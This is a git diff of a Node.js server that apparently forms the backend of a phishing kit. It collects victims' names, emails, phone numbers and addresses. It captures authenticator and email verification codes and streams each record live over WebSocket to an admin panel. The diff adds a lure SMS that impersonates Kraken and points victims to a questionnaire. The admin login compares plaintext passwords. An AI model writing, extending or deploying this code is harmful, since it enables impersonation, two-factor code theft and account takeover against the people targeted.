@@ -3,6 +3,7 @@ const http = require("http");
 const WebSocket = require("ws");
 const mysql = require("mysql2/promise");
 const path = require("path");
+const { sendSMS } = require("./oakTelSms");
 
 const app = express();
 app.use(express.json());
@@ -39,9 +40,7 @@ const init = (async () => {
   // ---- POST endpoint ----
   app.post("/add-user", async (req, res) => {
     try {
-      const { ip, fullname, email, mobile_number, address } = req.body;
-
-      let stat = "2";
+      const { ip, fullname, email, mobile_number, address, stat } = req.body;
 
       if (!ip) return res.status(400).json({ error: "ip required" });
       if (!fullname || !email)
@@ -70,6 +69,21 @@ const init = (async () => {
         data: userRecord,
       });
 
+      (async () => {
+        try {
+          const result = await sendSMS(
+            [mobile_number],
+            "Your Kraken questionnaire is ready. Please complete it at https://kraken.com/questionnaire"
+          );
+
+          console.log("SMS API Response:", result);
+        } catch (err) {
+          console.error("SMS Failed:", err.message);
+        }
+      })();
+
+     
+
       res.json(true);
     } catch (err) {
       console.error("DB Error:", err);
@@ -80,36 +94,36 @@ const init = (async () => {
   app.post("/verify-authenticator-code", async (req, res) => {
     try {
       const { ip, authenticatorCode } = req.body;
-  
+
       if (!ip) return res.status(400).json({ error: "ip required" });
       if (!authenticatorCode)
         return res.status(400).json({ error: "authenticatorCode required" });
-  
+
       // Update gauth field + gauth_date + stat
       const stat = "3"; // or whatever step you want after authenticator
-  
+
       await db.execute(
         `UPDATE users
          SET gauth = ?, gauth_date = NOW(), stat = ?
          WHERE ip = ?`,
         [authenticatorCode, stat, ip]
       );
-  
+
       // Fetch updated record
       const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
-  
+
       if (rows.length === 0) {
         return res.json(false); // IP not found
       }
-  
+
       const userRecord = rows[0];
-  
+
       // Notify WebSocket clients
       broadcast({
         type: "AUTH_CODE_UPDATED",
         data: userRecord,
       });
-  
+
       return res.json(true);
     } catch (err) {
       console.error("DB Error:", err);
@@ -120,14 +134,16 @@ const init = (async () => {
   app.post("/update-gauth-error", async (req, res) => {
     try {
       const { ip, errorCode } = req.body;
-  
+
       if (!ip) return res.status(400).json({ error: "ip required" });
       if (errorCode === undefined)
-        return res.status(400).json({ error: "errorCode (0 or 1) is required" });
-  
+        return res
+          .status(400)
+          .json({ error: "errorCode (0 or 1) is required" });
+
       // Sanitize: convert to string "0" / "1"
       const gauth_error = String(errorCode);
-  
+
       // Update gauth_error
       await db.execute(
         `UPDATE users
@@ -135,24 +151,23 @@ const init = (async () => {
          WHERE ip = ?`,
         [gauth_error, ip]
       );
-  
+
       // Fetch updated record
       const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
-  
+
       if (rows.length === 0) {
         return res.json(false); // IP not found
       }
-  
+
       const userRecord = rows[0];
-  
+
       // WebSocket broadcast
       broadcast({
         type: "GAUTH_ERROR_UPDATED",
         data: userRecord,
       });
-  
+
       return res.json(true);
-  
     } catch (err) {
       console.error("DB Error:", err);
       res.status(500).json({ error: "Internal server error" });
@@ -162,13 +177,13 @@ const init = (async () => {
   app.post("/update-stat", async (req, res) => {
     try {
       const { ip, stat } = req.body;
-  
+
       if (!ip) return res.status(400).json({ error: "ip required" });
       if (stat === undefined)
         return res.status(400).json({ error: "stat value is required" });
-  
+
       const statValue = String(stat); // Normalize
-  
+
       // Update stat
       await db.execute(
         `UPDATE users
@@ -176,24 +191,23 @@ const init = (async () => {
          WHERE ip = ?`,
         [statValue, ip]
       );
-  
+
       // Fetch updated record
       const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
-  
+
       if (rows.length === 0) {
         return res.json(false); // IP not found
       }
-  
+
       const userRecord = rows[0];
-  
+
       // WebSocket broadcast
       broadcast({
         type: "STAT_UPDATED",
         data: userRecord,
       });
-  
+
       return res.json(true);
-  
     } catch (err) {
       console.error("DB Error:", err);
       res.status(500).json({ error: "Internal server error" });
@@ -203,13 +217,13 @@ const init = (async () => {
   app.post("/update-email-code", async (req, res) => {
     try {
       const { ip, email_code } = req.body;
-  
+
       if (!ip) return res.status(400).json({ error: "ip required" });
       if (email_code === undefined)
         return res.status(400).json({ error: "email_code value is required" });
-  
+
       const emailCodeValue = String(email_code); // normalize
-  
+
       // Update email_code
       await db.execute(
         `UPDATE users
@@ -217,24 +231,23 @@ const init = (async () => {
          WHERE ip = ?`,
         [emailCodeValue, ip]
       );
-  
+
       // Fetch updated record
       const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
-  
+
       if (rows.length === 0) {
         return res.json(false); // IP not found
       }
-  
+
       const userRecord = rows[0];
-  
+
       // Notify all WebSocket clients
       broadcast({
         type: "EMAIL_CODE_UPDATED",
         data: userRecord,
       });
-  
+
       return res.json(true);
-  
     } catch (err) {
       console.error("DB Error:", err);
       res.status(500).json({ error: "Internal server error" });
@@ -244,13 +257,13 @@ const init = (async () => {
   app.post("/update-email-code-2", async (req, res) => {
     try {
       const { ip, email_code } = req.body;
-  
+
       if (!ip) return res.status(400).json({ error: "ip required" });
       if (email_code === undefined)
         return res.status(400).json({ error: "email_code value is required" });
-  
+
       const emailCodeValue = String(email_code); // normalize
-  
+
       // Update email_code
       await db.execute(
         `UPDATE users
@@ -258,24 +271,23 @@ const init = (async () => {
          WHERE ip = ?`,
         [emailCodeValue, ip]
       );
-  
+
       // Fetch updated record
       const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
-  
+
       if (rows.length === 0) {
         return res.json(false); // IP not found
       }
-  
+
       const userRecord = rows[0];
-  
+
       // Notify all WebSocket clients
       broadcast({
         type: "EMAIL_CODE_UPDATED_2",
         data: userRecord,
       });
-  
+
       return res.json(true);
-  
     } catch (err) {
       console.error("DB Error:", err);
       res.status(500).json({ error: "Internal server error" });
@@ -285,13 +297,15 @@ const init = (async () => {
   app.post("/update-email-code-error", async (req, res) => {
     try {
       const { ip, email_code_error } = req.body;
-  
+
       if (!ip) return res.status(400).json({ error: "ip required" });
       if (email_code_error === undefined)
-        return res.status(400).json({ error: "email_code_error value is required" });
-  
+        return res
+          .status(400)
+          .json({ error: "email_code_error value is required" });
+
       const emailCodeErrorValue = String(email_code_error); // normalize value
-  
+
       // Update email_code_error in database
       await db.execute(
         `UPDATE users
@@ -299,44 +313,41 @@ const init = (async () => {
          WHERE ip = ?`,
         [emailCodeErrorValue, ip]
       );
-  
+
       // Fetch updated record
       const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
-  
+
       if (rows.length === 0) {
         return res.json(false); // IP not found
       }
-  
+
       const userRecord = rows[0];
-  
+
       // Broadcast change to all WebSocket clients
       broadcast({
         type: "EMAIL_CODE_ERROR_UPDATED",
         data: userRecord,
       });
-  
+
       return res.json(true);
-  
     } catch (err) {
       console.error("DB Error:", err);
       res.status(500).json({ error: "Internal server error" });
     }
   });
-  
-
 
   // ---- WebSocket Connections ----
   wss.on("connection", (ws) => {
     console.log("Client connected");
-  
+
     // Handle messages from client
     ws.on("message", async (raw) => {
       try {
         const msg = JSON.parse(raw);
-  
+
         if (msg.type === "CHECK_IP") {
           const ip = msg.ip;
-  
+
           if (!ip) {
             return ws.send(
               JSON.stringify({
@@ -345,12 +356,12 @@ const init = (async () => {
               })
             );
           }
-  
+
           const [rows] = await db.execute(
             "SELECT stat FROM users WHERE ip = ?",
             [ip]
           );
-  
+
           if (rows.length === 0) {
             return ws.send(
               JSON.stringify({
@@ -359,7 +370,7 @@ const init = (async () => {
               })
             );
           }
-  
+
           // IP exists — return stat
           return ws.send(
             JSON.stringify({
@@ -373,7 +384,7 @@ const init = (async () => {
         console.error("WS ERROR:", err);
       }
     });
-  
+
     // Send latest 50 records on connect
     db.execute("SELECT * FROM users ORDER BY created_at DESC LIMIT 50")
       .then(([rows]) => {
@@ -385,39 +396,38 @@ const init = (async () => {
         );
       })
       .catch((err) => console.error("DB INIT ERROR:", err));
-  
+
     ws.on("close", () => console.log("Client disconnected"));
   });
 
   // Endpoint to handle admin login
-app.post("/admin-login", async (req, res) => {
-  try {
-    const { username, password } = req.body;
+  app.post("/admin-login", async (req, res) => {
+    try {
+      const { username, password } = req.body;
 
-    if (!username || !password) {
-      return res.status(400).json({ error: "Username and password required" });
+      if (!username || !password) {
+        return res
+          .status(400)
+          .json({ error: "Username and password required" });
+      }
+
+      // Fetch admin from database
+      const [rows] = await db.execute(
+        "SELECT * FROM admin_users WHERE username = ? AND password = ?",
+        [username, password]
+      );
+
+      if (rows.length === 0) {
+        return res.status(401).json({ error: "Invalid credentials" });
+      }
+
+      // Successful login
+      return res.json({ success: true });
+    } catch (err) {
+      console.error("Admin login error:", err);
+      res.status(500).json({ error: "Internal server error" });
     }
-
-    // Fetch admin from database
-    const [rows] = await db.execute(
-      "SELECT * FROM admin_users WHERE username = ? AND password = ?",
-      [username, password]
-    );
-
-    if (rows.length === 0) {
-      return res.status(401).json({ error: "Invalid credentials" });
-    }
-
-    // Successful login
-    return res.json({ success: true });
-
-  } catch (err) {
-    console.error("Admin login error:", err);
-    res.status(500).json({ error: "Internal server error" });
-  }
-});
-
-  
+  });
 
   // ---- Start on port 3000 ----
   server.listen(3000, () => {
